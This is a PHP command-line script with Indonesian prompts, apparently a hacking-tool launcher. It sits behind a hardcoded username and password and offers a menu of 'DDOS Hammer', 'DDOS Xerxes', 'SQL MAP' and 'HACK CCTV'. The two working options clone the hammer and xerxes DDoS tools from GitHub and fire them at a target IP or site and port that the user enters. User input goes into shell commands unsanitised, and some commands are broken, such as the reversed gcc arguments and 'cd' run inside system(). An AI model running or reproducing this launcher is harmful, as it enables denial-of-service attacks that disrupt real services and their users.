<?php
$username = 'xios';
$password = 'veganzy';
system('clear');
echo "=== LOGIN DULU =====\n";
sleep(1); 
echo "Username : ";
$user = trim(fgets(STDIN));
echo "Password :";
$pass = trim(fgets(STDIN));
sleep(1); 
system('clear');
if ($user == $username && $pass == $password){
echo "[+] Login Sukses\n";
sleep(2);
system('clear');
echo "=== MENU PILIHAN ====\n";
echo "1) DDOS Hammer";
echo "2) DDOS Xerxes";
echo "3) SQL MAP";
echo "4) HACK CCTV";
echo "===========\n";
sleep(1);
echo "PILIH=> ";
$menu = trim(fgets(STDIN));


if ($menu == 1){
system('clear');
sleep(1);
echo "[!] Installing Hammer DDOS";
sleep(1);
echo "[!] Thanks to cyweb";
system('git clone https://github.com/cyweb/hammer.git');
system('cd hammer');
system('clear');
echo "[+] Masukan IP Target :";
$ip = trim(fgets(STDIN));
echo "[+] Masukan Port :";
$port = trim(fgets(STDIN));
echo "[+] Masukan Turbo :";
$turbo = trim(fgets(STDIN));
sleep(1);
system('clear');
echo "[!] Started [!]";
sleep(2);
system('clear');
system("python hammer.py -s '$ip' -p '$port' -t '$turbo'");
}

if ($menu == 2){
system('clear');
echo "[!] Installing Xerxes";
system('git clone https://github.com/zanyarjamal/xerxes');
system('cd xerxes');
system('gcc xerxes -o xerxes.c');
system('clear');
echo "[+] Masukan Web Target : ( Tanpa HTTP / HTTPS )";
$target = trim(fgets(STDIN));
echo "[+] Masukan Port :";
$ipWeb = trim(fgets(STDIN));
system('clear');
system("./xerxes '$target' '$ipWeb'");
}

} else {
echo "[!] Incorrect Username and Password..";
}
?>
